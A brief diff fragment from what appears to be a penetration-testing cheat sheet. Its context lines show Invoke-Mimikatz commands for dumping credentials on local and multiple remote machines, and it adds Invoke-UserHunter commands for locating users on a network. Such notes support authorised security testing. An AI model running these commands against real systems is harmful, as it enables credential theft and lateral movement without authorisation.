@@ -46,3 +46,9 @@ Invoke-Mimikatz -DumpCreds
 Dump credentials on multiple remote machines.
 Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
 
+For user hunting:
+Invoke-UserHunter
+
+Invoke-UserHunter -Checkaccess
+
+
